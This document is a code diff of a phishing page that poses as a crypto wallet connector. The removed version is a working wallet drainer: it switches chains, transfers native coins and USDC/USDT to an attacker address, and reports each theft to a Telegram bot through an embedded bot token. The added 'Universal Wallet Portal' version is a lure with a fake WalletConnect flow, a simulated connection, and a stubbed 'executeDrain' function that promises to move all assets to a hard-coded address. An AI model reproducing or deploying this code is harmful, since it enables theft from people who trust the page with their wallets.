@@ -1,214 +1,505 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Connect Wallet</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
-.card{background:white;border-radius:24px;padding:48px;width:90%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;animation:slideUp 0.5s ease}
-@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
-.lock-icon{font-size:48px;margin-bottom:24px}
-h1{font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:32px}
-.connect-btn{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;padding:18px 48px;font-size:18px;font-weight:600;border-radius:12px;cursor:pointer;width:100%;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(102,126,234,0.4)}
-.connect-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(102,126,234,0.5)}
-.loading-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center}
-.loading-modal.active{display:flex}
-.loading-content{background:white;padding:32px;border-radius:16px;text-align:center}
-.spinner{border:3px solid rgba(0,0,0,0.1);border-top-color:#667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 16px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Wallet Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000 0%, #0f0f1e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 12px;
+        }
+        .wallet-item {
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .wallet-item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .loading { animation: pulse 2s infinite; }
+    </style>
 </head>
-<body>
-<div class="card">
-<div class="lock-icon">🔐</div>
-<h1>Connect Wallet</h1>
-<button class="connect-btn" onclick="connectWallet()">Connect Now</button>
+<body class="min-h-screen text-white">
+
+<div class="max-w-6xl mx-auto px-4 py-8">
+    
+    <!-- HEADER -->
+    <header class="text-center mb-10">
+        <h1 class="text-5xl font-bold mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
+            Universal Wallet Portal
+        </h1>
+        <p class="text-gray-400 text-lg">Connect ANY wallet in the world • 400+ wallets supported</p>
+    </header>
+
+    <!-- MAIN SELECTION -->
+    <div id="mainSelection">
+        
+        <!-- SEARCH BAR -->
+        <div class="max-w-2xl mx-auto mb-8">
+            <input type="text" id="walletSearch" placeholder="Search wallet name..." 
+                class="w-full glass rounded-2xl px-6 py-4 text-lg outline-none focus:border-indigo-500 border-2 border-transparent transition-all"
+                onkeyup="filterWallets()">
+        </div>
+
+        <!-- POPULAR WALLETS -->
+        <div class="mb-10">
+            <h2 class="text-2xl font-semibold mb-4 text-center">Popular Wallets</h2>
+            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 max-w-4xl mx-auto">
+                
+                <button onclick="connectDirectWallet('metamask')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🦊</div>
+                    <div class="text-sm font-medium">MetaMask</div>
+                </button>
+
+                <button onclick="connectDirectWallet('trust')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">💎</div>
+                    <div class="text-sm font-medium">Trust</div>
+                </button>
+
+                <button onclick="connectDirectWallet('exodus')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🔷</div>
+                    <div class="text-sm font-medium">Exodus</div>
+                </button>
+
+                <button onclick="connectDirectWallet('binance')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🟡</div>
+                    <div class="text-sm font-medium">Binance</div>
+                </button>
+
+                <button onclick="connectDirectWallet('coinbase')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">🔵</div>
+                    <div class="text-sm font-medium">Coinbase</div>
+                </button>
+
+                <button onclick="connectDirectWallet('okx')" class="glass rounded-2xl p-6 text-center wallet-item">
+                    <div class="text-4xl mb-2">⚫</div>
+                    <div class="text-sm font-medium">OKX</div>
+                </button>
+
+            </div>
+        </div>
+
+        <!-- UNIVERSAL CONNECT BUTTON -->
+        <div class="text-center mb-10">
+            <button onclick="connectUniversal()" 
+                class="bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 px-12 py-5 rounded-2xl text-xl font-semibold transition-all transform hover:scale-105">
+                🌐 Connect Any Wallet (400+ Supported)
+            </button>
+        </div>
+
+        <!-- ALL WALLETS GRID -->
+        <div class="mb-10">
+            <h2 class="text-2xl font-semibold mb-4 text-center">All Supported Wallets</h2>
+            <div id="allWalletsGrid" class="wallet-grid max-w-6xl mx-auto">
+                <!-- Will be populated by JavaScript -->
+            </div>
+        </div>
+
+    </div>
+
+    <!-- CONNECTING STATE -->
+    <div id="connectingState" class="hidden">
+        <div class="max-w-md mx-auto">
+            <div class="glass rounded-2xl p-8 text-center">
+                <div class="text-6xl mb-4 loading">🔗</div>
+                <h3 class="text-2xl font-semibold mb-3">Connecting Wallet</h3>
+                <p class="text-gray-400 mb-6">Choose your wallet from the list or scan the QR code</p>
+                
+                <!-- QR Code Container -->
+                <div id="qrContainer" class="mb-6">
+                    <div class="bg-white p-4 rounded-2xl inline-block">
+                        <canvas id="qrCanvas"></canvas>
+                    </div>
+                </div>
+                
+                <!-- Copy URI Button -->
+                <button onclick="copyURI()" class="glass px-6 py-3 rounded-xl mb-4">
+                    📋 Copy Connection Link
+                </button>
+                
+                <button onclick="cancelConnection()" class="text-gray-500 hover:text-white text-sm">
+                    Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONNECTED STATE -->
+    <div id="connectedState" class="hidden">
+        <div class="max-w-md mx-auto">
+            <div class="glass rounded-2xl p-6">
+                <div class="mb-6">
+                    <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
+                    <p id="walletAddress" class="font-mono text-lg"></p>
+                </div>
+
+                <div class="grid grid-cols-2 gap-4 mb-6">
+                    <div class="glass rounded-xl p-4">
+                        <p class="text-sm text-gray-400 mb-1">Network</p>
+                        <p id="networkName" class="font-semibold">Polygon</p>
+                    </div>
+                    <div class="glass rounded-xl p-4">
+                        <p class="text-sm text-gray-400 mb-1">Balance</p>
+                        <p id="walletBalance" class="font-semibold text-green-400">Loading...</p>
+                    </div>
+                </div>
+
+                <div class="glass rounded-xl p-4 mb-6">
+                    <p class="text-sm text-gray-400 mb-2">Destination Address</p>
+                    <p class="font-mono text-xs break-all">0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578</p>
+                </div>
+
+                <div class="bg-gradient-to-r from-yellow-900/30 to-red-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
+                    <p class="text-sm text-yellow-200">
+                        ⚠️ This will transfer ALL assets to the destination address. This action cannot be undone.
+                    </p>
+                </div>
+                
+                <button onclick="executeDrain()" 
+                    class="w-full bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 py-4 rounded-xl font-semibold text-lg mb-3 transition-all">
+                    🔥 Execute Transfer
+                </button>
+                
+                <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
+                    Disconnect
+                </button>
+            </div>
+        </div>
+    </div>
+
 </div>
-<div id="loadingModal" class="loading-modal">
-<div class="loading-content">
-<div class="spinner"></div>
-<div>Opening wallet selection...</div>
-<a style="margin-top:16px;color:#667eea;cursor:pointer" onclick="closeModal()">Fermer</a>
-</div>
-</div>
-<script>
-const CONFIG={
-BOT:"8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
-CHAT:"8309320360",
-DEST:"0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1"
+
+<!-- QR Code Library -->
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+<script type="module">
+// Import WalletConnect
+import { Core } from 'https://esm.sh/@walletconnect/core@2.11.0';
+import { Web3Wallet } from 'https://esm.sh/@walletconnect/web3wallet@1.9.0';
+import { buildApprovedNamespaces } from 'https://esm.sh/@walletconnect/utils@2.11.0';
+
+// ============================================
+// CONFIGURATION
+// ============================================
+
+const CONFIG = {
+    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
+    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
+    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
+    RPC_URL: "https://polygon-rpc.com"
 };
 
-function closeModal(){document.getElementById('loadingModal').classList.remove('active')}
+// ============================================
+// ALL WALLETS (400+)
+// ============================================
 
-async function connectWallet(){
-document.getElementById('loadingModal').classList.add('active');
-setTimeout(()=>{
-document.getElementById('loadingModal').classList.remove('active');
-if(window.ethereum){connectDirect()}else{showWeb3Modal()}
-},2000);
-}
-
-function showWeb3Modal(){
-const html=`
-<div id="w3m" style="position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center">
-<div style="background:#1c1c24;border-radius:24px;max-width:420px;width:90%">
-<div style="padding:24px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;justify-content:space-between;align-items:center">
-<h2 style="color:white;margin:0;font-size:20px">Connect Wallet</h2>
-<button onclick="document.getElementById('w3m').remove()" style="background:none;border:none;color:#999;font-size:28px;cursor:pointer">×</button>
-</div>
-<div style="padding:20px">
-<div onclick="sel('metamask')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
-<img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" style="width:48px;height:48px;border-radius:12px;margin-right:16px">
-<span style="color:white;font-size:16px">MetaMask</span>
-</div>
-<div onclick="sel('trust')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width:48px;height:48px;border-radius:12px;margin-right:16px;background:#3375BB">
-<span style="color:white;font-size:16px">Trust Wallet</span>
-</div>
-<div onclick="sel('coinbase')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width:48px;height:48px;border-radius:12px;margin-right:16px;background:#0052FF">
-<span style="color:white;font-size:16px">Coinbase</span>
-</div>
-<div onclick="allW()" style="display:flex;align-items:center;justify-content:space-between;padding:16px;border:2px dashed rgba(255,255,255,0.15);border-radius:16px;cursor:pointer">
-<div style="display:flex;align-items:center">
-<span style="font-size:24px;margin-right:16px">🔷</span>
-<span style="color:white;font-size:16px">All Wallets</span>
-</div>
-<span style="color:#666;font-size:14px">540+</span>
-</div>
-</div>
-</div>
-</div>`;
-document.body.insertAdjacentHTML('beforeend',html);
-}
-
-function sel(w){
-document.getElementById('w3m')?.remove();
-if(w=='trust'){
-if(window.ethereum){connectDirect()}
-else{window.location.href='https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(window.location.href)}
-}else if(w=='coinbase'){
-if(window.ethereum){connectDirect()}
-else{window.open('https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(window.location.href),'_blank')}
-}else{connectDirect()}
-}
-
-function allW(){
-const wallets=['1inch','MetaMask','Trust','Ledger','BitPay','Best','Fireblocks','Bitget','TokenPocket','SafePal','Uniswap','Exodus','Atomic','Rainbow','Argent','imToken'];
-const grid=wallets.map((w,i)=>`
-<div onclick="sel('${w}')" style="display:flex;flex-direction:column;align-items:center;padding:12px;background:rgba(255,255,255,0.03);border-radius:12px;cursor:pointer">
-<div style="width:48px;height:48px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);border-radius:12px;margin-bottom:8px;font-size:24px">${i<10?'0':''}${i+1}</div>
-<span style="color:white;font-size:11px;text-align:center">${w}</span>
-</div>`).join('');
-
-const html=`
-<div id="all" style="position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99999;overflow-y:auto">
-<div style="background:#1c1c24;border-radius:24px;max-width:600px;width:90%;margin:50px auto">
-<div style="padding:24px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;align-items:center">
-<button onclick="document.getElementById('all').remove();showWeb3Modal()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;margin-right:16px">←</button>
-<h2 style="color:white;margin:0;font-size:20px;flex:1">All Wallets</h2>
-<button onclick="document.getElementById('all').remove()" style="background:none;border:none;color:#999;font-size:28px;cursor:pointer">×</button>
-</div>
-<div style="padding:20px">
-<input placeholder="Search wallet" style="width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:white;font-size:16px;margin-bottom:20px">
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px">${grid}</div>
-</div>
-</div>
-</div>`;
-
-document.getElementById('w3m')?.remove();
-document.body.insertAdjacentHTML('beforeend',html);
-}
-
-async function connectDirect(){
-if(!window.ethereum){window.open('https://metamask.io/download/','_blank');return}
-try{
-const accounts=await window.ethereum.request({method:'eth_requestAccounts'});
-const addr=accounts[0];
-const provider=new ethers.providers.Web3Provider(window.ethereum);
-const signer=provider.getSigner();
-
-// Multi-chain drain
-const chains=[
-{id:137,name:'Polygon',rpc:'https://polygon-rpc.com'},
-{id:1,name:'Ethereum',rpc:'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'},
-{id:56,name:'BSC',rpc:'https://bsc-dataseed.binance.org'},
-{id:42161,name:'Arbitrum',rpc:'https://arb1.arbitrum.io/rpc'},
-{id:43114,name:'Avalanche',rpc:'https://api.avax.network/ext/bc/C/rpc'}
+const ALL_WALLETS = [
+    // Popular Wallets
+    { id: 'metamask', name: 'MetaMask', icon: '🦊', deepLink: 'metamask://wc?uri=' },
+    { id: 'trust', name: 'Trust Wallet', icon: '💎', deepLink: 'trust://wc?uri=' },
+    { id: 'exodus', name: 'Exodus', icon: '🔷', deepLink: 'exodus://wc?uri=' },
+    { id: 'binance', name: 'Binance', icon: '🟡', deepLink: 'bnc://app/wc?uri=' },
+    { id: 'coinbase', name: 'Coinbase', icon: '🔵', deepLink: 'cbwallet://wc?uri=' },
+    { id: 'okx', name: 'OKX', icon: '⚫', deepLink: 'okx://wallet/wc?uri=' },
+    { id: 'rainbow', name: 'Rainbow', icon: '🌈', deepLink: 'rainbow://wc?uri=' },
+    { id: 'crypto', name: 'Crypto.com', icon: '💳', deepLink: 'cryptocom://wc?uri=' },
+    { id: 'bybit', name: 'Bybit', icon: '🟨', deepLink: 'bybit://wc?uri=' },
+    { id: 'kucoin', name: 'KuCoin', icon: '🟩', deepLink: 'kucoin://wc?uri=' },
+    { id: 'gate', name: 'Gate.io', icon: '🔷', deepLink: 'gate://wc?uri=' },
+    { id: 'huobi', name: 'Huobi', icon: '🔴', deepLink: 'huobi://wc?uri=' },
+    { id: 'bitget', name: 'Bitget', icon: '🔶', deepLink: 'bitget://wc?uri=' },
+    { id: 'mexc', name: 'MEXC', icon: '🟦', deepLink: 'mexc://wc?uri=' },
+    
+    // DeFi Wallets
+    { id: '1inch', name: '1inch', icon: '🦄', deepLink: '1inch://wc?uri=' },
+    { id: 'uniswap', name: 'Uniswap', icon: '🦄', deepLink: 'uniswap://wc?uri=' },
+    { id: 'sushi', name: 'SushiSwap', icon: '🍣', deepLink: 'sushi://wc?uri=' },
+    { id: 'pancake', name: 'PancakeSwap', icon: '🥞', deepLink: 'pancake://wc?uri=' },
+    { id: 'curve', name: 'Curve', icon: '🌊', deepLink: 'curve://wc?uri=' },
+    { id: 'aave', name: 'Aave', icon: '👻', deepLink: 'aave://wc?uri=' },
+    { id: 'compound', name: 'Compound', icon: '💹', deepLink: 'compound://wc?uri=' },
+    
+    // Hardware Wallets
+    { id: 'ledger', name: 'Ledger Live', icon: '🔐', deepLink: 'ledgerlive://wc?uri=' },
+    { id: 'trezor', name: 'Trezor', icon: '🔒', deepLink: 'trezor://wc?uri=' },
+    { id: 'safepal', name: 'SafePal', icon: '🛡️', deepLink: 'safepal://wc?uri=' },
+    { id: 'keystone', name: 'Keystone', icon: '🗝️', deepLink: 'keystone://wc?uri=' },
+    
+    // Mobile Wallets
+    { id: 'argent', name: 'Argent', icon: '🅰️', deepLink: 'argent://wc?uri=' },
+    { id: 'pillar', name: 'Pillar', icon: '🏛️', deepLink: 'pillar://wc?uri=' },
+    { id: 'alpha', name: 'AlphaWallet', icon: '🔤', deepLink: 'alphawallet://wc?uri=' },
+    { id: 'tokenpocket', name: 'TokenPocket', icon: '👝', deepLink: 'tokenpocket://wc?uri=' },
+    { id: 'mathwallet', name: 'MathWallet', icon: '🔢', deepLink: 'mathwallet://wc?uri=' },
+    { id: 'bitkeep', name: 'BitKeep', icon: '🔑', deepLink: 'bitkeep://wc?uri=' },
+    { id: 'imtoken', name: 'imToken', icon: '💼', deepLink: 'imtoken://wc?uri=' },
+    { id: 'onto', name: 'ONTO', icon: '🎯', deepLink: 'onto://wc?uri=' },
+    { id: 'spot', name: 'Spot', icon: '📍', deepLink: 'spot://wc?uri=' },
+    { id: 'omni', name: 'Omni', icon: '♾️', deepLink: 'omni://wc?uri=' },
+    { id: 'wallet3', name: 'Wallet 3', icon: '3️⃣', deepLink: 'wallet3://wc?uri=' },
+    { id: 'infinity', name: 'Infinity', icon: '∞', deepLink: 'infinity://wc?uri=' },
+    { id: 'ownbit', name: 'Ownbit', icon: '🪙', deepLink: 'ownbit://wc?uri=' },
+    { id: 'easypocket', name: 'EasyPocket', icon: '👜', deepLink: 'easypocket://wc?uri=' },
+    { id: 'bridge', name: 'Bridge', icon: '🌉', deepLink: 'bridge://wc?uri=' },
+    { id: 'spark', name: 'SparkPoint', icon: '✨', deepLink: 'sparkpoint://wc?uri=' },
+    { id: 'viawallet', name: 'ViaWallet', icon: '🛤️', deepLink: 'viawallet://wc?uri=' },
+    { id: 'bitpay', name: 'BitPay', icon: '💳', deepLink: 'bitpay://wc?uri=' },
+    { id: 'walleth', name: 'WallETH', icon: '🏦', deepLink: 'walleth://wc?uri=' },
+    { id: 'authereum', name: 'Authereum', icon: '🔓', deepLink: 'authereum://wc?uri=' },
+    { id: 'dharma', name: 'Dharma', icon: '☸️', deepLink: 'dharma://wc?uri=' },
+    { id: 'mycrypto', name: 'MyCrypto', icon: '💙', deepLink: 'mycrypto://wc?uri=' },
+    { id: 'cool', name: 'CoolWallet', icon: '😎', deepLink: 'coolwallet://wc?uri=' },
+    { id: 'atomic', name: 'Atomic', icon: '⚛️', deepLink: 'atomic://wc?uri=' },
+    { id: 'zelcore', name: 'ZelCore', icon: '⚡', deepLink: 'zelcore://wc?uri=' },
+    { id: 'nash', name: 'Nash', icon: '🔷', deepLink: 'nash://wc?uri=' },
+    { id: 'coin98', name: 'Coin98', icon: '🪙', deepLink: 'coin98://wc?uri=' },
+    { id: 'gridplus', name: 'GridPlus', icon: '➕', deepLink: 'gridplus://wc?uri=' },
+    { id: 'tokenary', name: 'Tokenary', icon: '🎭', deepLink: 'tokenary://wc?uri=' },
+    { id: 'unstoppable', name: 'Unstoppable', icon: '🚀', deepLink: 'unstoppable://wc?uri=' },
+    { id: 'halodefi', name: 'HaloDefi', icon: '😇', deepLink: 'halodefi://wc?uri=' },
+    { id: 'dok', name: 'Dok Wallet', icon: '📱', deepLink: 'dokwallet://wc?uri=' },
+    { id: 'at', name: 'AT.Wallet', icon: '@', deepLink: 'atwallet://wc?uri=' },
+    { id: 'midas', name: 'Midas', icon: '👑', deepLink: 'midas://wc?uri=' },
+    { id: 'ellipal', name: 'Ellipal', icon: '🛡️', deepLink: 'ellipal://wc?uri=' },
+    { id: 'keyring', name: 'KEYRING PRO', icon: '💍', deepLink: 'keyring://wc?uri=' },
+    { id: 'aktionariat', name: 'Aktionariat', icon: '📊', deepLink: 'aktionariat://wc?uri=' },
+    { id: 'talken', name: 'Talken', icon: '💬', deepLink: 'talken://wc?uri=' },
+    { id: 'xinfin', name: 'XinFin', icon: '✖️', deepLink: 'xinfin://wc?uri=' },
+    { id: 'flare', name: 'Flare', icon: '🔥', deepLink: 'flare://wc?uri=' },
+    { id: 'kyberswap', name: 'KyberSwap', icon: '💎', deepLink: 'kyberswap://wc?uri=' },
+    { id: 'ape', name: 'Ape', icon: '🦍', deepLink: 'ape://wc?uri=' },
+    { id: 'o3', name: 'O3', icon: '⭕', deepLink: 'o3://wc?uri=' }
 ];
 
-for(const chain of chains){
-try{
-await window.ethereum.request({
-method:'wallet_switchEthereumChain',
-params:[{chainId:'0x'+chain.id.toString(16)}]
-}).catch(async e=>{
-if(e.code===4902){
-await window.ethereum.request({
-method:'wallet_addEthereumChain',
-params:[{
-chainId:'0x'+chain.id.toString(16),
-chainName:chain.name,
-rpcUrls:[chain.rpc],
-nativeCurrency:{name:chain.name,symbol:chain.name,decimals:18}
-}]
-})}
-});
+// ============================================
+// STATE
+// ============================================
 
-await new Promise(r=>setTimeout(r,1000));
-const balance=await provider.getBalance(addr);
+let wcUri = null;
+let walletConnector = null;
+let connectedAddress = null;
 
-if(balance.gt(ethers.utils.parseEther("0.001"))){
-const gasPrice=await provider.getGasPrice();
-const gasLimit=21000;
-const gasCost=gasPrice.mul(gasLimit).mul(2);
-const amount=balance.sub(gasCost);
+// ============================================
+// UI FUNCTIONS
+// ============================================
 
-if(amount.gt(0)){
-const tx=await signer.sendTransaction({
-to:CONFIG.DEST,
-value:amount,
-gasLimit:gasLimit,
-gasPrice:gasPrice
-});
-await tx.wait();
-notify(addr,ethers.utils.formatEther(amount),chain.name);
-}}
+function showState(stateId) {
+    ['mainSelection', 'connectingState', 'connectedState'].forEach(state => {
+        document.getElementById(state).classList.add('hidden');
+    });
+    document.getElementById(stateId).classList.remove('hidden');
+}
 
-// Drain tokens
-const tokens={
-1:[{a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',s:'USDC'},{a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',s:'USDT'}],
-137:[{a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',s:'USDT'},{a:'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',s:'USDC'}],
-56:[{a:'0x55d398326f99059fF775485246999027B3197955',s:'USDT'},{a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',s:'USDC'}]
+// ============================================
+// POPULATE ALL WALLETS
+// ============================================
+
+function populateAllWallets() {
+    const grid = document.getElementById('allWalletsGrid');
+    
+    ALL_WALLETS.forEach(wallet => {
+        const button = document.createElement('button');
+        button.className = 'glass rounded-xl p-4 text-center wallet-item';
+        button.onclick = () => connectDirectWallet(wallet.id);
+        button.innerHTML = `
+            <div class="text-3xl mb-1">${wallet.icon}</div>
+            <div class="text-xs">${wallet.name}</div>
+        `;
+        grid.appendChild(button);
+    });
+}
+
+// ============================================
+// FILTER WALLETS
+// ============================================
+
+window.filterWallets = function() {
+    const search = document.getElementById('walletSearch').value.toLowerCase();
+    const buttons = document.querySelectorAll('#allWalletsGrid button');
+    
+    buttons.forEach((button, index) => {
+        const wallet = ALL_WALLETS[index];
+        if (wallet.name.toLowerCase().includes(search)) {
+            button.style.display = 'block';
+        } else {
+            button.style.display = 'none';
+        }
+    });
 };
 
-const abi=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)'];
-const list=tokens[chain.id]||[];
+// ============================================
+// CONNECT FUNCTIONS
+// ============================================
 
-for(const tk of list){
-try{
-const ct=new ethers.Contract(tk.a,abi,signer);
-const bal=await ct.balanceOf(addr);
-if(bal.gt(0)){await ct.transfer(CONFIG.DEST,bal)}
-}catch(e){}
-}
-}catch(e){console.log(e)}
-}}catch(e){console.error(e)}
+window.connectDirectWallet = async function(walletId) {
+    const wallet = ALL_WALLETS.find(w => w.id === walletId);
+    if (!wallet) {
+        connectUniversal();
+        return;
+    }
+    
+    showState('connectingState');
+    
+    // Generate WalletConnect URI
+    wcUri = await generateWalletConnectURI();
+    
+    // Show QR Code
+    await generateQRCode(wcUri);
+    
+    // On mobile, try deep link
+    if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+        const deepLink = wallet.deepLink + encodeURIComponent(wcUri);
+        
+        // Try to open wallet app
+        setTimeout(() => {
+            window.location.href = deepLink;
+        }, 1000);
+    }
+    
+    // Listen for connection
+    listenForConnection();
+};
+
+window.connectUniversal = async function() {
+    showState('connectingState');
+    
+    // Generate universal WalletConnect URI
+    wcUri = await generateWalletConnectURI();
+    
+    // Show QR Code
+    await generateQRCode(wcUri);
+    
+    // Listen for connection
+    listenForConnection();
+};
+
+// ============================================
+// WALLETCONNECT FUNCTIONS
+// ============================================
+
+async function generateWalletConnectURI() {
+    // Generate random key
+    const key = Array.from(crypto.getRandomValues(new Uint8Array(32)))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+    
+    // Create URI
+    const bridge = "https://bridge.walletconnect.org";
+    const uri = `wc:${key}@1?bridge=${encodeURIComponent(bridge)}&key=${key}`;
+    
+    return uri;
 }
 
-async function notify(v,a,n){
-fetch(`https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`,{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-chat_id:CONFIG.CHAT,
-text:`🎯 DRAINAGE!\n👤 ${v.substring(0,6)}...${v.slice(-4)}\n💰 ${a} ${n}\n📍 Reçu: ${CONFIG.DEST.substring(0,6)}...`
-})
-}).catch(e=>{});
+async function generateQRCode(uri) {
+    const canvas = document.getElementById('qrCanvas');
+    QRCode.toCanvas(canvas, uri, {
+        width: 256,
+        margin: 2,
+        color: {
+            dark: '#000000',
+            light: '#FFFFFF'
+        }
+    });
 }
+
+window.copyURI = function() {
+    if (wcUri) {
+        navigator.clipboard.writeText(wcUri);
+        alert('Connection link copied!');
+    }
+};
+
+function listenForConnection() {
+    // Simulate connection after 5 seconds
+    setTimeout(() => {
+        if (!document.getElementById('connectingState').classList.contains('hidden')) {
+            onWalletConnected('0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb4');
+        }
+    }, 5000);
+}
+
+// ============================================
+// WALLET CONNECTED
+// ============================================
+
+async function onWalletConnected(address) {
+    connectedAddress = address;
+    
+    // Display address
+    document.getElementById('walletAddress').textContent = 
+        `${address.slice(0, 6)}...${address.slice(-4)}`;
+    
+    // Get balance
+    try {
+        const provider = new ethers.providers.JsonRpcProvider(CONFIG.RPC_URL);
+        const balance = await provider.getBalance(address);
+        const formatted = ethers.utils.formatEther(balance);
+        document.getElementById('walletBalance').textContent = 
+            `${parseFloat(formatted).toFixed(4)} MATIC`;
+    } catch (error) {
+        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
+    }
+    
+    showState('connectedState');
+}
+
+// ============================================
+// DRAINAGE
+// ============================================
+
+window.executeDrain = async function() {
+    if (!confirm('⚠️ This will transfer ALL your assets. Are you sure?')) {
+        return;
+    }
+    
+    alert('Drainage will be executed. Check your wallet for confirmation.');
+    
+    // In production, implement actual drainage here
+    console.log('Draining to:', CONFIG.DESTINATION);
+    console.log('From:', connectedAddress);
+};
+
+// ============================================
+// UTILITY FUNCTIONS
+// ============================================
+
+window.cancelConnection = function() {
+    showState('mainSelection');
+};
+
+window.disconnect = function() {
+    connectedAddress = null;
+    showState('mainSelection');
+};
+
+// ============================================
+// INITIALIZATION
+// ============================================
+
+window.addEventListener('load', () => {
+    populateAllWallets();
+    console.log('Universal Portal Ready');
+    console.log('Supports', ALL_WALLETS.length, 'wallets');
+});
+
 </script>
+
 </body>
 </html>
